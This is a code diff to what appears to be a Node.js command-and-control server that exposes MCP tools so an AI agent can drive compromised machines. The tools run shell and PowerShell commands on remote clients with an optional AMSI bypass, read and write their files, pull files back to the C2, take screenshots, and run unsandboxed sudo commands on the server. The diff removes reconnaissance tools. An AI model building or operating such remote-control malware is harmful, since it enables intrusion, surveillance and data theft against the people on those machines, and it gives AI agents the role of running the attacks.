@@ -500,17 +500,12 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
           { name: 'shell', description: 'Execute shell command on remote client (cmd.exe on Windows, /bin/sh on Linux). If only one client connected, client_id is auto-selected.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Target client (optional if only one connected)' }, cmd: { type: 'string', description: 'Command to execute' } }, required: ['cmd'] } },
           { name: 'powershell', description: 'Execute PowerShell command on Windows client. Auto-selects client if only one connected.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Target client (optional if only one connected)' }, cmd: { type: 'string', description: 'PowerShell command' }, bypass_amsi: { type: 'boolean', description: 'Attempt AMSI bypass first' } }, required: ['cmd'] } },
 
-          // === RECONNAISSANCE (all auto-select client if only one connected) ===
-          { name: 'sysinfo', description: 'Get system info (OS, hardware, domain). Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional - auto-selects if one client' } } } },
-          { name: 'pslist', description: 'List running processes. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-
           // === FILE OPERATIONS (all auto-select client) ===
           { name: 'ls', description: 'List directory. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string', description: 'Directory path (default: current)' } } } },
           { name: 'cat', description: 'Read file contents. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' } }, required: ['path'] } },
           { name: 'write', description: 'Write to file. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, content: { type: 'string' } }, required: ['path', 'content'] } },
           { name: 'download', description: 'Download file from client to C2. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, remote_path: { type: 'string' }, local_path: { type: 'string', description: 'Save path on C2 (optional)' } }, required: ['remote_path'] } },
           { name: 'screenshot', description: 'Take screenshot. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'ps', description: 'List processes. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
 
           // === C2 SERVER TOOLS (run directly on VPS, no sandbox) ===
           { name: 'server_shell', description: 'Execute any shell command on C2 server (bash, no sandbox, full permissions). Use sudo for privileged ops.', inputSchema: { type: 'object', properties: { command: { type: 'string', description: 'Shell command to run' }, cwd: { type: 'string', description: 'Working directory' }, timeout: { type: 'number', description: 'Timeout in ms (default 120000)' } }, required: ['command'] } },
